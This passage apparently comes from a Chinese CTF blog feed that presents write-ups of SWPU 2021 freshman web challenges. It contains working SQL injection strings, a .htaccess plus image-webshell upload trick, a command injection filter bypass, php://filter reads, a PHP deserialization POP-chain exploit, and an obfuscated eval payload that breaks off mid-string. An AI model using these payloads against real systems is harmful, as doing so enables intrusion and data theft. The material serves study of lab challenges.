<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1;<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/10/2021/nss/0/image-20211010194430322.png" alt="image-20211010194430322"></p>
<p>就在我以为完事大吉的时候</p>
<p>现实给我当头一棒</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">1;<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;Flag&#x27;</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/10/2021/nss/0/image-20211010194709636.png" alt="image-20211010194709636"></p>
<p>看了wp才知道，原来是要去猜测出本来的sql语句查询时什么样的</p>
<p><strong>select $_POST[‘query’] || flag from Flag</strong></p>
<p>sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数<br>当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR函数<br>第一种就按默认没有配置来进行，此时||就是逻辑或<br>||在命令执行中见过，<br>回顾:<br>command1;command2顺序执行<br>command1 || command2<br>如果command1执行失败，则执行command2<br>command1 &amp;&amp; command2<br>如果command1执行成功，则执行command2</p>
<p>因此只需要将</p>
<p>$_POST[‘query’]<br>提交的数据换成*,1(如果直接写的话会被报错，且写在后面会失效)<br>解释:<br>sql=select.post[‘query’].”||flag from Flag”;（拼接语句）<br>如果$post[‘query’]的数据为</p>
<p>*,1<br>sql语句就变成了select *,1||flag from Flag，<br>就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。<br>此处的1是临时增加一列，列名为1且这一列的所有值都为1</p>
<p>执行payload：*,1</p>
<p><img src="/2021/10/10/2021/nss/0/image-20211010195151922.png" alt="image-20211010195151922"></p>
<p>得到flag</p>
<ul>
<li><p>官方给的 payload 是 <code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
</li>
<li><p>拼接一下就是 <code>select 1;set sql_mode=PIPES_AS_CONCAT;select 1||flag from Flag</code></p>
</li>
<li><p>关于 <code>sql_mode</code> : 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的 <code>PIPES_AS_CONCAT</code> 将 <code>||</code> 视为字符串的连接操作符而非 “或” 运算符</p>
</li>
<li><p>关于 <code>sql_mode</code> 更多可以查看这个链接 : <a href="https://www.cnblogs.com/piperck/p/9835695.html">MySQL sql_mode 说明</a></p>
</li>
<li><p>还有就是这个模式下进行查询的时候，使用字母连接会报错，使用数字连接才会查询出数据，因为这个 <code>||</code> 相当于是将 <code>select 1</code> 和 <code>select flag from flag</code> 的结果拼接在一起</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>nss</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPU新生赛2021Web部分Writeup</title>
    <url>/2021/10/04/2021/nss/2/</url>
    <content><![CDATA[<p>参与了一下</p>
<p>新生赛，发现基础还不够扎实</p>
<p>顺便记录一下解题</p>
<h3 id="gift-F12"><a href="#gift-F12" class="headerlink" title="gift_F12"></a>gift_F12</h3><p><img src="/2021/10/04/2021/nss/2/image-20211004103854327.png"></p>
<p>按照题目提示，F12</p>
<p>最开始无脑往下滑，被嘲讽了一波</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211004104026843.png" alt="image-20211004104026843"></p>
<p>本来以为还要控制台修改时间获取</p>
<p>结果再往上找找就行</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211004104228392.png" alt="image-20211004104228392"></p>
<h3 id="caidao"><a href="#caidao" class="headerlink" title="caidao"></a>caidao</h3><p><img src="/2021/10/04/2021/nss/2/image-20211004104329873.png" alt="image-20211004104329873"></p>
<p>提示足够明显了</p>
<p>直接连，这时候直接猜想到index.php文件（也可以不嫌麻烦dirsearch扫）</p>
<p>试着连</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211004104536627.png" alt="image-20211004104536627"></p>
<p>成功连上</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211004104630630.png" alt="image-20211004104630630"></p>
<h3 id="jicao"><a href="#jicao" class="headerlink" title="jicao"></a>jicao</h3><p>题如其意，很简单</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211004104742735.png" alt="image-20211004104742735"></p>
<p><img src="/2021/10/04/2021/nss/2/image-20211004105437367.png" alt="image-20211004105437367"></p>
<p><img src="/2021/10/04/2021/nss/2/image-20211004105448146.png" alt="image-20211004105448146"></p>
<h3 id="Do-you-know-http"><a href="#Do-you-know-http" class="headerlink" title="Do_you_know_http"></a>Do_you_know_http</h3><p>这题很眼熟</p>
<p>很像之前做过的</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211004110036413.png" alt="image-20211004110036413"></p>
<p><img src="/2021/10/04/2021/nss/2/image-20211004110055171.png" alt="image-20211004110055171"></p>
<p>这里抓包会被克制</p>
<p>直接用hackbar</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211004110238860.png" alt="image-20211004110238860"></p>
<h3 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy_md5"></a>easy_md5</h3><p><img src="/2021/10/04/2021/nss/2/image-20211004110322862.png" alt="image-20211004110322862"></p>
<p>数组绕过即可</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211004110433124.png" alt="image-20211004110433124"></p>
<h3 id="easyupload1-0"><a href="#easyupload1-0" class="headerlink" title="easyupload1.0"></a>easyupload1.0</h3><p>改类型上传php，没什么好说的</p>
<h3 id="easyupload2-0"><a href="#easyupload2-0" class="headerlink" title="easyupload2.0"></a>easyupload2.0</h3><p>上传phtml马文件绕过，蚁剑连上</p>
<h3 id="easyupload3-0"><a href="#easyupload3-0" class="headerlink" title="easyupload3.0"></a>easyupload3.0</h3><p>这题坑了我好久啊啊啊啊啊啊</p>
<p>思路：.htaccess + 图片马</p>
<p>只需上传一个简单的htaccess文件即可</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute"><span class="hljs-nomarkup">SetHandler</span></span> application/x-httpd-php<br></code></pre></td></tr></table></figure>

<p>不用加上其他语句，考虑是因为加上让服务器报错</p>
<p>先上传.htaccess</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211019203937057.png" alt="image-20211019203937057"></p>
<p>再图片马</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211019204032598.png" alt="image-20211019204032598"></p>
<p>访问路径解析</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211019204113233.png" alt="image-20211019204113233"></p>
<p>蚁剑连上，密码为1</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211019204205382.png" alt="image-20211019204205382"></p>
<p><img src="/2021/10/04/2021/nss/2/image-20211019204310865.png" alt="image-20211019204310865"></p>
<h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>基础题，直接查数据库，查表，最后查字名</p>
<h3 id="easyrce"><a href="#easyrce" class="headerlink" title="easyrce"></a>easyrce</h3><p>命令执行漏洞</p>
<p><a href="https://www.cnblogs.com/-qing-/p/10819069.html">https://www.cnblogs.com/-qing-/p/10819069.html</a></p>
<h3 id="babyrce"><a href="#babyrce" class="headerlink" title="babyrce"></a>babyrce</h3><p><img src="/2021/10/04/2021/nss/2/QQ%E5%9B%BE%E7%89%8720211004210427.png"></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span>/flllllaaaaaaggggggg<br></code></pre></td></tr></table></figure>

<h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><p>伪协议读取</p>
<p>php://filter/read=convert.base64.encode/resource=flag.php</p>
<p><a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结 - SegmentFault 思否</a></p>
<h3 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h3><p><img src="/2021/10/04/2021/nss/2/image-20211004210242660.png" alt="image-20211004210242660"></p>
<p>这题虽然很简单，被我当时秒解的原因竟然是误打误撞（doge）</p>
<p>打开靶机，可爱的小胡桃</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211009205021612.png" alt="image-20211009205021612"></p>
<p>f12看下</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211009205055755.png" alt="image-20211009205055755"></p>
<p>提示很明显了，robots协议</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211009205151043.png" alt="image-20211009205151043"></p>
<p>访问一下就有题目源码了：</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211009205233533.png" alt="image-20211009205233533"></p>
<p>很简单的序列化，唯一要注意的点是，我们想让类 wllm的属性admin和passwd的值为admin和ctf，</p>
<p>而魔术方法构造却会强迫让他们值变成user和123456</p>
<p>所以我们序列化的时候直接删去就好，就不会触发了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br>show_source(<span class="hljs-string">&quot;cl45s.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">wllm</span></span>&#123;<br><br>    <span class="hljs-keyword">public</span> $admin = <span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> $passwd = <span class="hljs-string">&quot;ctf&quot;</span>;<br><br><br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;admin === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;passwd === <span class="hljs-string">&quot;ctf&quot;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br>            <span class="hljs-keyword">echo</span> $flag;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Just a bit more!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br>$p = <span class="hljs-keyword">new</span> wllm();<br><span class="hljs-keyword">echo</span>(serialize($p));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/04/2021/nss/2/image-20211009205525269.png" alt="image-20211009205525269"></p>
<h3 id="no-wakeup"><a href="#no-wakeup" class="headerlink" title="no_wakeup"></a>no_wakeup</h3><p><a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html">php反序列化漏洞绕过魔术方法 __wakeup - Mrsm1th - 博客园 (cnblogs.com)</a></p>
<p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>，他验证的时候是不会进行url解码的<br><img src="/2021/10/04/2021/nss/2/image-20211018211216896.png" alt="image-20211018211216896"></p>
<h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br>show_source(<span class="hljs-string">&quot;index.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br><br>  <span class="hljs-keyword">private</span> $admin = <span class="hljs-string">&#x27;aaa&#x27;</span>;<br>  <span class="hljs-keyword">protected</span> $passwd = <span class="hljs-string">&#x27;123456&#x27;</span>;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;admin === <span class="hljs-string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;passwd ===<span class="hljs-string">&#x27;08067&#x27;</span>)&#123;<br>      <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>      <span class="hljs-keyword">echo</span> $flag;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;admin;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;passwd;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nono&#x27;</span>;<br>    &#125;<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>  <span class="hljs-keyword">public</span> $w00m;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;w00m;<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>  <span class="hljs-keyword">public</span> $w00m;<br>  <span class="hljs-keyword">public</span> $w22m;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">$this</span>-&gt;w00m-&gt;&#123;<span class="hljs-keyword">$this</span>-&gt;w22m&#125;();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br><br>$w00m = $_GET[<span class="hljs-string">&#x27;w00m&#x27;</span>];<br>unserialize($w00m);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>我们来分析分析</p>
<p>总共分为了三个类对吧，最终的目的是想触发第一个类class w44m里的GetFlag()了</p>
<p>我们要充分利用这三个类</p>
<p>payload的部分：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">$a = <span class="hljs-keyword">new</span> w22m();<br><br>$b = <span class="hljs-keyword">new</span> w33m();<br><br>$c = <span class="hljs-keyword">new</span> w44m();<br><br>$b -&gt; w00m = $c;<br><br>$b -&gt; w22m = <span class="hljs-string">&quot;GetFlag&quot;</span>;<br><br>$a -&gt; w00m = $b;<br><br><span class="hljs-keyword">echo</span> urlencode(serialize($a));<br></code></pre></td></tr></table></figure>

<p>首先任取三个变量，比如我这里取了a，b，c</p>
<p>分别赋值新的三个类</p>
<p>让变量b里的属性w00m赋值为w44m，也就是满足</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">if</span><span class="hljs-params">(<span class="hljs-variable">$this</span>-&gt;admin === <span class="hljs-string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="hljs-variable">$this</span>-&gt;passwd ===<span class="hljs-string">&#x27;08067&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure>

<p>另外一个属性w22m赋值“GetFlag”，完成调用函数的步骤</p>
<p>利用了这句**$this-&gt;w00m-&gt;{$this-&gt;w22m}**，这样就实现w44m -&gt; GetFlag()</p>
<p>之后让变量a里的属性w00m赋值b</p>
<p>随之会触发析构函数_destruct</p>
<p>最后的urlencode是因为题目里的获取参数值是get获取，会经过浏览器的url解析。</p>
<p>完整payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w44m</span></span>&#123;<br><br>    <span class="hljs-keyword">private</span> $admin = <span class="hljs-string">&#x27;w44m&#x27;</span>;<br>    <span class="hljs-keyword">protected</span> $passwd = <span class="hljs-string">&#x27;08067&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Getflag</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;admin === <span class="hljs-string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;passwd ===<span class="hljs-string">&#x27;08067&#x27;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> $flag;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;admin;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;passwd;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nono&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w22m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $w00m;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;w00m;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">w33m</span></span>&#123;<br>    <span class="hljs-keyword">public</span> $w00m;<br>    <span class="hljs-keyword">public</span> $w22m;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;w00m-&gt;&#123;<span class="hljs-keyword">$this</span>-&gt;w22m&#125;();<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br>$a = <span class="hljs-keyword">new</span> w22m();<br>$b = <span class="hljs-keyword">new</span> w33m();<br>$c = <span class="hljs-keyword">new</span> w44m();<br>$b -&gt; w00m = $c;<br>$b -&gt; w22m = <span class="hljs-string">&quot;GetFlag&quot;</span>;<br>$a -&gt; w00m = $b;<br><span class="hljs-keyword">echo</span> urlencode(serialize($a));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/10/04/2021/nss/2/image-20211009203101560.png" alt="image-20211009203101560"></p>
<h3 id="PseudoProtocols"><a href="#PseudoProtocols" class="headerlink" title="PseudoProtocols"></a>PseudoProtocols</h3><p>挺简单的</p>
<p>前面先用php伪协议读取hint.php的源码</p>
<p>后面再用data伪协议读取flag</p>
<p><img src="/2021/10/04/2021/nss/2/image-20211014212448219.png" alt="image-20211014212448219"></p>
<p><img src="/2021/10/04/2021/nss/2/image-20211014212513570.png" alt="image-20211014212513570"></p>
<h3 id="hardrce-3"><a href="#hardrce-3" class="headerlink" title="hardrce_3"></a>hardrce_3</h3><p><img src="/2021/10/04/2021/nss/2/image-20211015195502084.png" alt="image-20211015195502084"></p>
<p>get传参，提示了异或和取反都不能用，过滤数字</p>
<p>一旦绕过便可以执行eval</p>
<p>用了mumuzi的payload</p>
<p>自增：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><code class="hljs angelscript">%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>D%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>D%<span class="hljs-number">40</span>%<span class="hljs-number">22</span>%<span class="hljs-number">24</span>_%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">5</span>B%<span class="hljs-number">27</span>%<span class="hljs-number">21</span>%<span class="hljs-number">27</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">3</span>D%<span class="hljs-number">27</span>%<span class="hljs-number">40</span>%<span class="hljs-number">27</span>%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>___%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>___.%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>___.%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>___.%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>___.%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>___.%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>____%<span class="hljs-number">3</span>D%<span class="hljs-number">27</span>_%<span class="hljs-number">27</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">3</span>D%<span class="hljs-number">24</span>_%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>__%<span class="hljs-number">2</span>B%<span class="hljs-number">2</span>B%<span class="hljs-number">3</span>B%<span 